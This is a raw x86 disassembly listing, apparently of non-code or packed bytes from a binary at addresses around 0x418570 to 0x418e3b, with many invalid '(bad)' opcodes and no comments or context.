  41856d:	or     BYTE PTR [eax],dl
  41856f:	jmp    0xa9518b7d
  418574:	or     DWORD PTR [edx+0x4f9e9fd],eax
  41857a:	add    cl,ch
  41857c:	stc    
  41857d:	add    al,0x0
  41857f:	test   eax,0xa91008f9
  418584:	stc    
  418585:	add    al,0x10
  418587:	jmp    0xa94f0775
  41858c:	jmp    0xfa2a8596
  418591:	or     BYTE PTR [eax],al
  418593:	test   eax,0xe90005c9
  418598:	stc    
  418599:	or     BYTE PTR [eax],al
  41859b:	jmp    0xe9518b69
  4185a0:	test   eax,0xf629fd81
  4185a5:	add    al,0x0
  4185a7:	sub    esi,edi
  4185a9:	or     BYTE PTR [eax],dl
  4185ab:	jmp    0x13f0759
  4185b0:	jecxz  0x41862a
  4185b2:	add    DWORD PTR [eax],eax
  4185b4:	mov    ds:0xd30ffd75,eax
  4185b9:	or     BYTE PTR [eax],al
  4185bb:	add    bl,dl
  4185bd:	or     BYTE PTR [eax],al
  4185bf:	adc    BYTE PTR [ebx+0x5],ah
  4185c2:	add    al,0x10
	...
  4185d4:	add    BYTE PTR [eax],al
  4185d6:	and    ecx,DWORD PTR [ecx]
  4185d8:	add    al,0x10
  4185da:	push   ebx
  4185db:	add    eax,0x5531000
  4185e0:	add    al,0x0
  4185e2:	and    edi,DWORD PTR [ecx-0x3]
  4185e5:	packsswb mm0,QWORD PTR ds:0x79130000
  4185ec:	add    DWORD PTR [eax],edx
  4185ee:	adc    ecx,DWORD PTR [ecx]
  4185f0:	add    al,0x0
  4185f2:	arpl   WORD PTR ds:0x5231000,ax
  4185f8:	add    al,0x10
  4185fa:	adc    esi,DWORD PTR [ebp-0x3]
  4185fd:	rcpps  xmm6,XMMWORD PTR [ebp-0x3]
  418601:	mov    db0,ebp
  418604:	add    BYTE PTR [eax],al
  418606:	arpl   WORD PTR [ebp+0x1],si
  418609:	adc    BYTE PTR [ebx],dl
  41860b:	jne    0x41860e
  41860d:	add    BYTE PTR [ebx],dl
  41860f:	jne    0x418612
  418611:	add    BYTE PTR [ebx-0x5c00028c],ah
  418617:	je     0x418616
  418619:	call   DWORD PTR [ebx-0x2cfffbfc]
  41861f:	add    al,0x0
  418621:	adc    bl,ah
  418623:	je     0x418626
  418625:	adc    bh,ah
  418627:	xor    bh,ch
  418629:	call   ebx
  41862b:	add    al,0x0
  41862d:	add    bl,dl
  41862f:	add    al,0x0
  418631:	add    BYTE PTR [edi],ah
  418633:	sub    edi,ebp
  418635:	inc    DWORD PTR [ebx+0x2c]
  418638:	std    
  418639:	inc    DWORD PTR [eax]
	...
  41864b:	add    dl,bh
  41864d:	test   DWORD PTR [edi+edi*8],ebp
  418650:	popf   
  418651:	outs   dx,BYTE PTR ds:[esi]
  418652:	add    DWORD PTR [eax],eax
  418654:	cli    
  418655:	ins    DWORD PTR es:[edi],dx
  418656:	add    DWORD PTR [eax],eax
  418658:	cli    
  418659:	addr16 sub bh,bh
  41865c:	test   DWORD PTR [edx-0x558200d5],eax
  418662:	sub    al,0xff
  418664:	jne    0x4186d4
  418666:	add    DWORD PTR [eax],eax
  418668:	cli    
  418669:	ins    DWORD PTR es:[edi],dx
  41866a:	add    DWORD PTR [eax],eax
  41866c:	cli    
  41866d:	jns    0x418697
  41866f:	call   FWORD PTR [ebp+0x3e]
  418672:	call   DWORD PTR cs:[ebp-0x46]
  418676:	sub    al,0xff
  418678:	dec    ebp
  418679:	outs   dx,BYTE PTR ds:[esi]
  41867a:	add    DWORD PTR [eax],eax
  41867c:	cli    
  41867d:	ins    DWORD PTR es:[edi],dx
  41867e:	add    DWORD PTR [eax],eax
  418680:	cli    
  418681:	popf   
  418682:	daa    
  418683:	push   DWORD PTR ds:0x2dff2b46
  418689:	out    0x2b,al
  41868b:	jmp    DWORD PTR ds:0xfa00016e
  418691:	ins    DWORD PTR es:[edi],dx
  418692:	add    DWORD PTR [eax],eax
  418694:	cli    
  418695:	xlat   BYTE PTR ds:[ebx]
  418696:	dec    DWORD PTR es:0x5ff2dea
  41869d:	outs   dx,BYTE PTR ds:[esi]
  41869e:	sub    bh,bh
  4186a0:	std    
  4186a1:	ins    DWORD PTR es:[edi],dx
  4186a2:	add    DWORD PTR [eax],eax
  4186a4:	cli    
  4186a5:	ins    DWORD PTR es:[edi],dx
  4186a6:	add    DWORD PTR [eax],eax
  4186a8:	cli    
  4186a9:	dec    ecx
  4186aa:	and    edi,edi
  4186ac:	in     eax,0xe9
  4186ae:	sub    eax,0xff
	...
  4186bf:	add    BYTE PTR [eax],al
  4186c1:	add    ch,bl
  4186c3:	popa   
  4186c4:	sub    bh,bh
  4186c6:	aad    0x6d
  4186c8:	add    DWORD PTR [eax],eax
  4186ca:	cli    
  4186cb:	ins    DWORD PTR es:[edi],dx
  4186cc:	add    DWORD PTR [eax],eax
  4186ce:	cli    
  4186cf:	jmp    DWORD PTR [eax]
  4186d1:	(bad)  
  4186d2:	mov    ebp,0xb5ff2dd5
  4186d7:	add    al,0xf
  4186d9:	sub    ebp,DWORD PTR [ebp-0x5fc1881]
  4186df:	add    al,0xe7
  4186e1:	add    edi,edx
  4186e3:	add    al,0xd5
  4186e5:	and    edx,DWORD PTR [ebp-0x72d28481]
  4186eb:	jg     0x418700
  4186ed:	sub    eax,DWORD PTR [ebp-0x5fc1881]
  4186f3:	add    al,0xe7
  4186f5:	add    edi,edx
  4186f7:	add    al,0xd1
  4186f9:	and    ch,BYTE PTR [ebp+0x7f]
  4186fc:	xchg   DWORD PTR ds:0x3e77f65,ebp
  418702:	cli    
  418703:	add    al,0xe7
  418705:	add    edi,edx
  418707:	add    al,0xe7
  418709:	add    edi,edx
  41870b:	add    al,0xe7
  41870d:	add    edi,edx
  41870f:	add    al,0xe7
  418711:	add    edi,edx
  418713:	add    al,0x7b
  418715:	sub    eax,0x2d617f35
  41871a:	sub    eax,0x252ce57f
  41871f:	jg     0x41871c
  418721:	sub    al,0x1d
  418723:	jg     0x41872c
  418725:	sub    eax,0x0
	...
  418736:	add    BYTE PTR [eax],al
  418738:	adc    eax,0xd2d137f
  41873d:	jg     0x418740
  41873f:	sub    eax,0x2ca17f05
  418744:	std    
  418745:	jle    0x4186dc
  418747:	sub    al,0xf5
  418749:	jle    0x4186d6
  41874b:	sub    al,0xed
  41874d:	jle    0x4186e6
  41874f:	sub    al,0xe5
  418751:	jle    0x4186e6
  418753:	sub    al,0xdd
  418755:	jle    0x4187d0
  418757:	sub    al,0xd5
  418759:	jle    0x4187b0
  41875b:	sub    al,0xcd
  41875d:	jle    0x41879a
  41875f:	sub    al,0xc5
  418761:	jle    0x418763
  418763:	sbb    ecx,DWORD PTR [esi]
  418765:	jle    0x418764
  418767:	or     esp,esi
  418769:	jge    0x418768
  41876b:	fucom  st(1)
  41876d:	jge    0x41876c
  41876f:	in     eax,0xdd
  418771:	jge    0x418770
  418773:	call   ebp
  418775:	jge    0x418774
  418777:	pop    es
  418778:	loop   0x4187f7
  41877a:	std    
  41877b:	add    esp,edx
  41877d:	jge    0x41877c
  41877f:	xor    edx,edx
  418781:	jge    0x418780
  418783:	adc    eax,0x3bfd7dd2
  418788:	and    bh,BYTE PTR [esi-0x3]
  41878b:	ins    DWORD PTR es:[edi],dx
  41878c:	and    bh,BYTE PTR [esi-0x3]
  41878f:	jns    0x4187a3
  418791:	jle    0x418790
  418793:	dec    ecx
  418794:	adc    bh,BYTE PTR [esi-0x3]
  418797:	cmp    eax,0xa9fd7e22
	...
  4187ac:	add    BYTE PTR [eax],al
  4187ae:	and    bh,BYTE PTR [esi-0x3]
  4187b1:	cdq    
  4187b2:	adc    bh,BYTE PTR [esi-0x3]
  4187b5:	mov    edx,DWORD PTR [edx]
  4187b7:	jle    0x4187b6
  4187b9:	jnp    0x41879d
  4187bb:	jge    0x4187ba
  4187bd:	repz loop 0x41883d
  4187c0:	std    
  4187c1:	pop    es
  4187c2:	sar    DWORD PTR [ebp-0x3],cl
  4187c5:	pop    ss
  4187c6:	sar    DWORD PTR [ebp-0x3],cl
  4187c9:	mov    ds:0xd5fd7de2,eax
  4187ce:	loop   0x41884d
  4187d0:	std    
  4187d1:	sar    DWORD PTR gs:[ebp-0x3],cl
  4187d5:	push   ebp
  4187d6:	sar    DWORD PTR [ebp-0x3],cl
  4187d9:	and    DWORD PTR [ebx],0x2367fd7e
  4187df:	jle    0x4187de
  4187e1:	das    
  4187e2:	adc    edi,DWORD PTR [esi-0x3]
  4187e5:	aas    
  4187e6:	adc    edi,DWORD PTR [esi-0x3]
  4187e9:	std    
  4187ea:	and    bh,BYTE PTR [esi-0x3]
  4187ed:	add    bh,dh
  4187ef:	sub    edi,ebp
  4187f1:	(bad)  
  4187f2:	(bad)  [edi]
  4187f4:	std    
  4187f5:	(bad)  
  4187f6:	mov    ecx,0x6bfffd27
  4187fb:	daa    
  4187fc:	std    
  4187fd:	(bad)  
  4187fe:	jmp    0x418826
  418800:	std    
  418801:	(bad)  
  418802:	cmp    esp,DWORD PTR [edi]
  418804:	std    
  418805:	jmp    FWORD PTR ds:0xa3fffd27
  41880b:	add    DWORD PTR [eax],eax
  41880d:	add    BYTE PTR [ecx],dh
  41880f:	sub    ch,bh
  418811:	inc    DWORD PTR [eax]
	...
  418823:	add    BYTE PTR [ecx+0x27],ch
  418826:	std    
  418827:	call   DWORD PTR [ecx+0x27]
  41882a:	std    
  41882b:	call   DWORD PTR [ecx-0x7e0002d9]
  418831:	daa    
  418832:	std    
  418833:	dec    DWORD PTR [ebp+0x53fffd27]
  418839:	add    DWORD PTR [eax],eax
  41883b:	add    BYTE PTR [ebx+0x26],dl
  41883e:	std    
  41883f:	jmp    DWORD PTR [ebx+0x1]
  418842:	add    BYTE PTR [eax],al
  418844:	sub    esp,DWORD PTR [esi]
  418846:	std    
  418847:	dec    DWORD PTR [ebx+0x17fffd26]
  41884d:	es std 
  41884f:	(bad)  
  418850:	cmp    DWORD PTR [esi],esp
  418852:	std    
  418853:	dec    DWORD PTR [ebx+0x26]
  418856:	std    
  418857:	dec    DWORD PTR [ebx+0x26]
  41885a:	std    
  41885b:	call   FWORD PTR [ebx-0x660002da]
  418861:	es std 
  418863:	jmp    FWORD PTR [ecx+0x26]
  418866:	std    
  418867:	call   ebx
  418869:	es std 
  41886b:	jmp    ebx
  41886d:	or     BYTE PTR [eax],al
  41886f:	add    BYTE PTR ds:0xd3fffd23,dh
  418875:	or     BYTE PTR [eax],al
  418877:	add    dl,bh
  418879:	pop    ss
  41887a:	es call ebp
  41887d:	pop    esp
  41887e:	and    edi,edi
  418880:	int    0x6e
  418882:	add    DWORD PTR [eax],eax
  418884:	cli    
  418885:	mov    ebp,0xff21
	...
  41889a:	mov    ebp,0xb5ff21b2
  41889f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188a0:	and    edi,edi
  4188a2:	lods   eax,DWORD PTR ds:[esi]
  4188a3:	cmp    ah,BYTE PTR [edi+edi*8]
  4188a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188a7:	cmp    al,0x24
  4188a9:	call   FWORD PTR [ebp-0x6a00dc38]
  4188af:	outs   dx,BYTE PTR ds:[esi]
  4188b0:	add    DWORD PTR [eax],eax
  4188b2:	cli    
  4188b3:	out    dx,eax
  4188b4:	and    edi,edi
  4188b6:	test   esp,ebp
  4188b8:	and    edi,edi
  4188ba:	jge    0x418890
  4188bc:	and    edi,edi
  4188be:	jne    0x418846
  4188c0:	and    al,0xff
  4188c2:	ins    DWORD PTR es:[edi],dx
  4188c3:	loopne 0x4188e8
  4188c5:	jmp    DWORD PTR [ebp-0x52]
  4188c8:	and    al,0xff
  4188ca:	pop    ebp
  4188cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188cc:	and    al,0xff
  4188ce:	push   ebp
  4188cf:	shl    BYTE PTR [edi+edi*8],0x4d
  4188d3:	test   al,0x24
  4188d5:	inc    DWORD PTR [ebp-0x6a]
  4188d8:	and    al,0xff
  4188da:	cmp    eax,0xfa00016e
  4188df:	outs   dx,DWORD PTR ds:[esi]
  4188e0:	and    bh,bh
  4188e2:	sub    eax,0x25ff227c
  4188e7:	outs   dx,BYTE PTR ds:[esi]
  4188e8:	add    DWORD PTR [eax],eax
  4188ea:	cli    
  4188eb:	shr    DWORD PTR [ecx],0xff
  4188ee:	adc    eax,0xdff29d8
  4188f3:	ins    BYTE PTR es:[edi],dx
  4188f4:	sub    bh,bh
  4188f6:	add    eax,0xfdff2852
  4188fb:	or     eax,0xff27
	...
  418910:	cmc    
  418911:	jns    0x41893b
  418913:	(bad)  
  418914:	in     eax,dx
  418915:	add    al,0xe1
  418917:	sub    ch,ah
  418919:	jnp    0x4188cc
  41891b:	sub    ch,bl
  41891d:	jnp    0x4188dc
  41891f:	sub    ch,dl
  418921:	jnp    0x4188a6
  418923:	sub    ch,cl
  418925:	jnp    0x41899e
  418927:	sub    ch,al
  418929:	jnp    0x4189a6
  41892b:	sub    BYTE PTR [ebp-0x4ad6a685],bh
  418931:	jnp    0x418970
  418933:	sub    DWORD PTR [ebp-0x5ad75c85],ebp
  418939:	jnp    0x4188f4
  41893b:	sub    BYTE PTR [ebp-0x6ad73685],bl
  418941:	jnp    0x418916
  418943:	sub    BYTE PTR [ebp-0x7ad81485],cl
  418949:	jnp    0x418920
  41894b:	daa    
  41894c:	jge    0x4189c9
  41894e:	or     eax,0xf17b7528
  418953:	daa    
  418954:	ins    DWORD PTR es:[edi],dx
  418955:	jnp    0x418986
  418957:	sub    BYTE PTR [ebp+0x7b],ah
  41895a:	cmp    ebp,DWORD PTR [eax]
  41895c:	pop    ebp
  41895d:	jnp    0x418978
  41895f:	sub    BYTE PTR [ebp+0x7b],dl
  418962:	arpl   WORD PTR [edi],sp
  418964:	dec    ebp
  418965:	jnp    0x4189be
  418967:	daa    
  418968:	inc    ebp
  418969:	jnp    0x4189b2
  41896b:	daa    
  41896c:	cmp    eax,0x3527437b
  418971:	jnp    0x41891a
  418973:	daa    
	...
  418984:	add    BYTE PTR [eax],al
  418986:	sub    eax,0x2527377b
  41898b:	jnp    0x4189d6
  41898d:	daa    
  41898e:	sbb    eax,0x1527597b
  418993:	jnp    0x418976
  418995:	es or  eax,0x5270d7b
  41899b:	jnp    0x41899a
  41899d:	es std 
  41899f:	jp     0x4189a1
  4189a1:	mov    ds:0xbdfd7a1c,eax
  4189a6:	adc    al,0x7a
  4189a8:	std    
  4189a9:	ins    DWORD PTR es:[edi],dx
  4189aa:	sbb    al,0x7a
  4189ac:	std    
  4189ad:	jge    0x4189c3
  4189af:	jp     0x4189ae
  4189b1:	inc    ecx
  4189b2:	sbb    al,0x7a
  4189b4:	std    
  4189b5:	dec    edi
  4189b6:	adc    al,0x7a
  4189b8:	std    
  4189b9:	aaa    
  4189ba:	sbb    al,0x7a
  4189bc:	std    
  4189bd:	pop    ss
  4189be:	adc    al,0x7a
  4189c0:	std    
  4189c1:	add    eax,0xedfd79dc
  4189c6:	xlat   BYTE PTR ds:[ebx]
  4189c7:	jns    0x4189c6
  4189c9:	add    DWORD PTR [eax-0x67ec0285],ebx
  4189cf:	jnp    0x4189ce
  4189d1:	adc    DWORD PTR [eax-0x67de0285],ebx
  4189d7:	jnp    0x4189d6
  4189d9:	and    DWORD PTR [eax-0x67b80285],ebx
  4189df:	jnp    0x4189de
  4189e1:	jmp    0x5b418edf
  4189e6:	pop    eax
  4189e7:	jnp    0x4189e6
  4189e9:	push   ebx
	...
  4189fa:	add    BYTE PTR [eax],al
  4189fc:	pop    eax
  4189fd:	jnp    0x4189fc
  4189ff:	stos   DWORD PTR es:[edi],eax
  418a00:	pop    eax
  418a01:	jnp    0x418a00
  418a03:	mov    ebx,0x8bfd7b58
  418a08:	pop    eax
  418a09:	jnp    0x418a08
  418a0b:	jg     0x418a65
  418a0d:	jnp    0x418a0c
  418a0f:	jmp    0xd9418f0d
  418a14:	sbb    BYTE PTR [ebx-0x3],bh
  418a17:	jmp    0x11418f15
  418a1c:	sbb    DWORD PTR [ebx-0x3],edi
  418a1f:	and    DWORD PTR [ecx],ebx
  418a21:	jnp    0x418a20
  418a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a24:	sbb    BYTE PTR [ebx-0x3],bh
  418a27:	mov    bl,0x18
  418a29:	jnp    0x418a28
  418a2b:	add    BYTE PTR [ebx],ch
  418a2d:	addr16 (bad) 
  418a2f:	(bad)  
  418a30:	cmp    esp,DWORD PTR [edi-0x2]
  418a33:	call   FWORD PTR [ebx+0x66]
  418a36:	(bad)  
  418a37:	dec    DWORD PTR [ecx+0x66]
  418a3a:	(bad)  
  418a3b:	dec    DWORD PTR [ecx+0x66]
  418a3e:	(bad)  
  418a3f:	call   DWORD PTR [ebx]
  418a41:	data16 (bad) 
  418a43:	jmp    ebx
  418a45:	add    eax,0x661d0000
  418a4a:	(bad)  
  418a4b:	call   ebx
  418a4d:	add    eax,0x65f90000
  418a52:	(bad)  
  418a53:	call   FWORD PTR [ebp-0x5c00019b]
  418a59:	add    eax,0x61030000
  418a5e:	(bad)  
  418a5f:	inc    DWORD PTR [eax]
	...
  418a71:	add    bh,bh
  418a73:	pusha  
  418a74:	(bad)  
  418a75:	(bad)  
  418a76:	(bad)  [eax-0x2]
  418a79:	inc    edi
  418a7b:	pusha  
  418a7c:	(bad)  
  418a7d:	(bad)  
  418a7e:	frstor [eax-0x2]
  418a81:	jmp    FWORD PTR [ecx]
  418a83:	popa   
  418a84:	(bad)  
  418a85:	jmp    DWORD PTR [ebx+0x5]
  418a88:	add    BYTE PTR [eax],al
  418a8a:	loope  0x418af1
  418a8c:	(bad)  
  418a8d:	(bad)  
  418a8e:	in     eax,dx
  418a8f:	gs (bad) 
  418a91:	(bad)  
  418a92:	frstor [ebp-0x2]
  418a95:	(bad)  
  418a96:	mov    ebx,0xb1fffe65
  418a9b:	gs (bad) 
  418a9d:	call   DWORD PTR [ebx-0x7400019b]
  418aa3:	gs (bad) 
  418aa5:	call   DWORD PTR [ecx-0x7600019b]
  418aab:	gs (bad) 
  418aad:	dec    ebx
  418aaf:	gs (bad) 
  418ab1:	call   DWORD PTR [ebx]
  418ab3:	add    eax,0x6dfa0000
  418ab8:	in     al,0xfe
  418aba:	or     eax,0x5fee471
  418abf:	imul   eax,DWORD PTR [ecx],0x0
  418ac2:	cli    
  418ac3:	js     0x418ac6
  418ac5:	inc    ecx
  418ac6:	push   0x5773e449
  418acb:	mov    al,ds:0xad5f6bec
  418ad0:	add    DWORD PTR [edi],edi
  418ad2:	clc    
  418ad3:	mov    ebx,0x5ee8
	...
  418ae8:	pop    esi
  418ae9:	test   al,0xec
  418aeb:	imul   edx,DWORD PTR [edi+0x6e],0x1
  418aef:	and    edx,edi
  418af1:	stos   BYTE PTR es:[edi],al
  418af2:	in     eax,dx
  418af3:	ins    BYTE PTR es:[edi],dx
  418af4:	dec    ecx
  418af5:	or     ecx,0xed8a245e
  418afb:	(bad)  
  418afc:	cli    
  418afd:	jb     0x418b03
  418aff:	push   ebp
  418b00:	sub    ch,dl
  418b02:	mul    DWORD PTR [edx+0x34]
  418b05:	aad    0xef
  418b07:	(bad)  
  418b08:	cli    
  418b09:	jo     0x418b0f
  418b0b:	ins    BYTE PTR es:[edi],dx
  418b0c:	or     edx,edx
  418b0e:	cmc    
  418b0f:	imul   ebx,DWORD PTR [edi],0xffffffd0
  418b12:	sar    bh,0x7d
  418b15:	inc    BYTE PTR [eax]
  418b17:	inc    ebp
  418b18:	out    0xbe,al
  418b1a:	in     eax,0x5e
  418b1c:	ficomp WORD PTR [ecx]
  418b1e:	out    dx,eax
  418b1f:	pusha  
  418b20:	shr    DWORD PTR [ebp+0x1],1
  418b23:	mov    ch,0xfb
  418b25:	push   ds
  418b26:	lock ins BYTE PTR es:[edi],dx
  418b28:	fmul   DWORD PTR [eax+esi*8]
  418b2b:	push   edx
  418b2c:	fdivr  QWORD PTR [ecx-0x10]
  418b2f:	pusha  
  418b30:	shr    DWORD PTR [ebp+0x1],1
  418b33:	hlt    
  418b34:	sti    
  418b35:	sub    edi,ebp
  418b37:	pusha  
  418b38:	fwait
  418b39:	add    edx,ecx
  418b3b:	jno    0x418ad4
  418b3d:	add    BYTE PTR [eax+esi*8],al
  418b40:	sti    
  418b41:	add    al,0xb3
  418b43:	lock call 0xc5e8:0xa1c2cae5
  418b4b:	in     al,0x0
	...
  418b5d:	add    BYTE PTR ds:0x9604f078,cl
  418b63:	repz mov edx,0xbff49af5
  418b69:	ret    0x77f5
  418b6c:	fiadd  DWORD PTR [esi+ebx*2]
  418b6f:	hlt    
  418b70:	mov    dl,0xf5
  418b72:	pop    edx
  418b73:	out    0x9a,al
  418b75:	ret    0x77dd
  418b78:	test   BYTE PTR [edx],0x3f
  418b7b:	loop   0x418b17
  418b7d:	leave  
  418b7e:	push   esp
  418b7f:	jmp    0xf18b4e07
  418b84:	js     0x418b70
  418b86:	pop    ebx
  418b87:	bnd jb 0x418b70
  418b8a:	sub    al,dh
  418b8c:	out    0x3,al
  418b8e:	xchg   ecx,eax
  418b8f:	add    al,0xa4
  418b91:	sti    
  418b92:	adc    eax,0x38e854e6
  418b97:	out    0x54,eax
  418b99:	jmp    0x418ba6
  418b9b:	call   0xe75a7ae4
  418ba0:	push   edx
  418ba1:	aad    0x9
  418ba3:	repz dec edi
  418ba5:	repnz push ss
  418ba7:	hlt    
  418ba8:	daa    
  418ba9:	add    al,0x16
  418bab:	push   es
  418bac:	cs out 0xe9,eax
  418baf:	mov    esi,0xd3d8f03f
  418bb4:	paddd  mm3,mm0
  418bb7:	add    al,0xdd
  418bb9:	add    edi,DWORD PTR [ebx-0x361cf40e]
  418bbf:	loope  0x418be5
  418bc1:	jmp    0x418bc3
	...
  418bd3:	add    cl,dl
  418bd5:	loope  0x418c0a
  418bd7:	jecxz  0x418ba6
  418bd9:	hlt    
  418bda:	pslld  mm3,QWORD PTR [esi-0x617003b]
  418be1:	add    al,0x2
  418be3:	sbb    al,0x19
  418be5:	out    0x55,eax
  418be7:	rcl    BYTE PTR [eax+esi*8],1
  418bea:	dec    esp
  418beb:	mov    DWORD PTR [ebx-0x22],0x55f9cc6b
  418bf2:	add    dh,BYTE PTR [ebx+ecx*1+0x23b95eea]
  418bf9:	fisub  WORD PTR [edx-0x4a]
  418bfc:	retf   0x45e0
  418bff:	rcr    ch,0xe3
  418c02:	inc    DWORD PTR [edx-0x8]
  418c05:	enter  0x886c,0xd5
  418c09:	retf   0x8b66
  418c0c:	iret   
  418c0d:	xlat   BYTE PTR ds:[ebx]
  418c0e:	jno    0x418ba0
  418c10:	mov    eax,0xf8bafd76
  418c15:	mov    edi,0xf4a97d62
  418c1a:	ins    BYTE PTR es:[edi],dx
  418c1b:	mov    bh,BYTE PTR [eax-0x6b849c1e]
  418c21:	cmc    
  418c22:	jo     0x418c0d
  418c24:	stc    
  418c25:	cmp    bh,0x2d
  418c28:	xchg   ebx,eax
  418c29:	repnz push ebx
  418c2b:	inc    esp
  418c2c:	mov    esp,esi
  418c2e:	dec    edi
  418c2f:	dec    eax
  418c30:	xchg   edx,eax
  418c31:	fidivr WORD PTR [esi]
  418c33:	jmp    0x2a41be31
	...
  418c48:	add    BYTE PTR [eax],al
  418c4a:	mov    bl,ah
  418c4c:	pop    esi
  418c4d:	xor    eax,0x3b66c263
  418c52:	arpl   bp,sp
  418c54:	jae    0x418c94
  418c56:	push   0xf9e93eef
  418c5b:	(bad)  
  418c5d:	and    al,0x63
  418c5f:	jmp    0xfd66:0xc0631d62
  418c66:	push   edx
  418c67:	aaa    
  418c68:	add    BYTE PTR [eax],al
  418c6a:	push   ebx
  418c6b:	add    DWORD PTR [ebx+0x65],eax
  418c6e:	das    
  418c6f:	inc    ebx
  418c70:	jb     0x418ce4
  418c72:	xor    DWORD PTR [ebp+0x6b],ebp
  418c75:	je     0x418c7a
  418c77:	jae    0x418ce5
  418c79:	arpl   WORD PTR [esi],bp
  418c7b:	jae    0x418ced
  418c7d:	add    BYTE PTR [ebx+0x3f695302],dh
  418c83:	ins    DWORD PTR es:[edi],dx
  418c84:	inc    eax
  418c85:	push   0x6f517432
  418c8a:	inc    esi
  418c8b:	jge    0x418cf6
  418c8d:	je     0x418c59
  418c8f:	inc    ebx
  418c90:	jbe    0x418d06
  418c92:	mov    esi,0x9d00ad01
  418c97:	push   0x688d646b
  418c9c:	outs   dx,DWORD PTR ds:[esi]
  418c9d:	jae    0x418d0e
  418c9f:	aas    
  418ca0:	data16 ins BYTE PTR es:[edi],dx
  418ca2:	jle    0x418ce4
  418ca4:	std    
  418ca5:	dec    esp
  418ca7:	add    ch,BYTE PTR [ebx+esi*2+0x3f]
  418cab:	je     0x418d0d
  418cad:	ins    DWORD PTR es:[edi],dx
	...
  418cbe:	add    BYTE PTR [eax],al
  418cc0:	xor    ebp,DWORD PTR [ecx+0x3e]
  418cc3:	add    cl,ch
  418cc5:	add    BYTE PTR [esi+0x69],al
  418cc8:	and    eax,0x1b654b5e
  418ccd:	jge    0x418d12
  418ccf:	imul   eax,DWORD PTR [edi+0x6c],0x176003e
  418cd6:	inc    esi
  418cd7:	imul   eax,ebp,0x246c406c
  418cdd:	jb     0x418d41
  418cdf:	add    BYTE PTR [edi+0x0],ch
  418ce2:	inc    ebx
  418ce3:	gs das 
  418ce5:	push   esp
  418ce6:	ins    BYTE PTR es:[edi],dx
  418ce7:	fs cs jne 0x418d4d
  418ceb:	dec    eax
  418cec:	repnz popaw 
  418cef:	ins    BYTE PTR es:[edi],dx
  418cf0:	(bad)  
  418cf1:	aas    
  418cf2:	std    
  418cf3:	(bad)  
  418cf4:	cli    
  418cf5:	cmc    
  418cf6:	add    eax,DWORD PTR [ebp-0x21]
  418cf9:	(bad)  
  418cfb:	(bad)  
  418cfc:	enter  0xec7a,0x6c
  418d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d01:	and    ah,bh
  418d03:	ds cli 
  418d05:	inc    ecx
  418d06:	add    al,0x45
  418d08:	lahf   
  418d09:	outs   dx,DWORD PTR ds:[esi]
  418d0a:	int    0x6c
  418d0c:	cdq    
  418d0d:	dec    esp
  418d0e:	in     eax,dx
  418d0f:	(bad)
  418d14:	mov    ebx,0xfb74016b
  418d19:	sahf   
  418d1a:	call   0xf2863692
  418d1f:	jae    0x418d80
  418d21:	inc    ecx
  418d22:	int3   
  418d23:	ins    DWORD PTR es:[edi],dx
	...
  418d34:	add    BYTE PTR [eax],al
  418d36:	push   esp
  418d37:	dec    ebx
  418d38:	add    DWORD PTR [eax+0x73e8aafb],esp
  418d3e:	inc    ebp
  418d3f:	xchg   ebp,eax
  418d40:	jmp    0x418da5
  418d42:	gs fwait
  418d44:	repnz inc ebx
  418d46:	arpl   WORD PTR [eax-0xcb19f18],dx
  418d4c:	out    dx,al
  418d4d:	jbe    0x418d8a
  418d4f:	pop    esi
  418d50:	add    DWORD PTR [ebp-0x5],ecx
  418d53:	stos   BYTE PTR es:[edi],al
  418d54:	call   0xec31d7cc
  418d59:	jne    0x418d76
  418d5b:	cli    
  418d5c:	out    0x4f,eax
  418d5e:	sub    bl,bl
  418d60:	in     eax,0x66
  418d62:	es leave 
  418d64:	into   
  418d65:	jae    0x418d6f
  418d67:	vpcmpgtb ymm7,ymm2,YMMWORD PTR [ebx]
  418d6b:	pop    esi
  418d6c:	add    DWORD PTR [edx-0x8],edi
  418d6f:	push   cs
  418d70:	in     eax,0x73
  418d72:	mov    ecx,0xd771f238
  418d77:	retf   
  418d78:	test   DWORD PTR [ebx-0x2d],0xe660e52f
  418d7f:	add    al,0x16
  418d81:	repnz int3 
  418d83:	(bad)
  418d86:	jmp    0xca329092
  418d8b:	test   BYTE PTR [ecx],0xef
  418d8e:	int    0xc5
  418d90:	out    0x3,al
  418d92:	mov    BYTE PTR ds:0xd4a9e726,0xf8
  418d99:	jmp    0x0:0x0
	...
  418dac:	scas   eax,DWORD PTR es:[edi]
  418dad:	in     eax,0xf2
  418daf:	out    0xad,al
  418db1:	not    ch
  418db3:	in     eax,0x9c
  418db5:	loopne 0x418d7a
  418db7:	rcr    BYTE PTR [eax-0x69152519],1
  418dbd:	loop   0x418d5b
  418dbf:	loop   0x418d51
  418dc1:	jmp    0x7437507f
  418dc6:	mov    al,0x2
  418dc8:	aaa    
  418dc9:	jmp    0xe2b4:0xde6bd3ba
  418dd0:	imul   ebp,edx,0xeb66f1b6
  418dd6:	(bad)  
  418dd7:	out    dx,eax
  418dd8:	pop    eax
  418dd9:	mov    esi,0x504f784
  418dde:	or     eax,0x7aea3704
  418de3:	shr    BYTE PTR [eax],0xf7
  418de6:	js     0x418dce
  418de8:	pop    ds
  418de9:	stc    
  418dea:	stos   BYTE PTR es:[edi],al
  418deb:	jmp    0xf70e:0xf789ea2b
  418df2:	pop    edi
  418df3:	ret    
  418df4:	xchg   ebp,eax
  418df5:	jae    0x418df4
  418df7:	add    BYTE PTR [esi],bl
  418df9:	clc    
  418dfa:	pop    edx
  418dfb:	repnz adc edx,ebp
  418dfe:	cmp    al,0xd5
  418e00:	jge    0x418e75
  418e02:	hlt    
  418e03:	add    ecx,eax
  418e05:	stc    
  418e06:	dec    edx
  418e07:	clc    
  418e08:	aam    0xc6
  418e0a:	jmp    FWORD PTR [edi]
  418e0c:	(bad)  
  418e0d:	out    0x53,al
  418e0f:	add    BYTE PTR ds:[eax],al
	...
  418e22:	inc    edi
  418e23:	jmp    0x1b5e:0xeb3b0c63
  418e2a:	idiv   BYTE PTR [edi-0x1]
  418e2d:	sub    eax,0x53f75d
  418e32:	pop    ebx
  418e33:	fadd   QWORD PTR [eax+0x16]
  418e36:	sub    eax,0xf9e973e1
  418e3b:	lods   eax,DWORD PTR ds:[esi]
